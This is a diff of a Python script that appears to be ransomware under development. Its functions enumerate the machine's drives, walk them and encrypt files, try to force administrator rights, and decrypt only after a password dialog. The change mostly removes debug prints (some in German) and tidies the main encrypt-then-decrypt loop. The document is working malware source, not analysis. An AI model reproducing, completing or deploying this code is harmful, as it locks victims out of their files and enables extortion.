@@ -23,7 +23,6 @@ def get_drives(mode):
             drives.append(letter + ":")
         bitmask >>= 1
     drives.remove("C:")
-    drives.append("C:" + environ["HOMEPATH"])
     drives.append("sportacus")
     drives.remove("F:")
     for i in drives:
@@ -36,29 +35,16 @@ def get_drives(mode):
 
 
 def encrypt(method):
-    s = 0
-    b = 0
     first_counter = 1
     second_counter = 0
     drives = get_drives(1)
-    print(drives)
     for drive in drives:
-        try:
-            print("Walked drive:\t" + drive)
-            print("Working dircetory:\t" + drives[0 + first_counter])
-            print("Counter:\t" + str(first_counter))
-            print("Second Counter:\t" + str(second_counter))
-        except:
-            pass
         try:
             chdir(drives[0 + first_counter])
         except:
-            print("Erster Error")
             if second_counter == 1:
-                print("Second Counter in True:\t" + str(second_counter))
                 return True
             second_counter += 1
-            print("Second Counter nach erhöhung:\t" + str(second_counter))
             chdir(drives[0])
         for root, sub, file in walk(drive):
             for files in file:
@@ -75,20 +61,11 @@ def encrypt(method):
 def decrypt(method):
     first_counter = 1
     second_counter = 0
-    b = 0
     drives = get_drives(1)
-    print(drives)
     for drive in drives:
-        try:
-            print("Walked drive:\t" + drive)
-            print("Working dircetory:\t" + drives[0 + first_counter])
-            print("Counter:\t" + str(first_counter))
-        except:
-            pass
         try:
             chdir(drives[0 + first_counter])
         except:
-            print("Erster Error")
             if second_counter == 1:
                 return True
             second_counter += 1
@@ -132,18 +109,11 @@ def force_admin():
         return True
 
 
-#force_admin()  # gut machen
 pwd = get_drives(0)
 method = crypt_basic()
-print(pwd)
 
 while not encrypt(method):
     pass
-print("success")
 if dialog(pwd):
     while not decrypt(method):
         pass
-
-
-
-
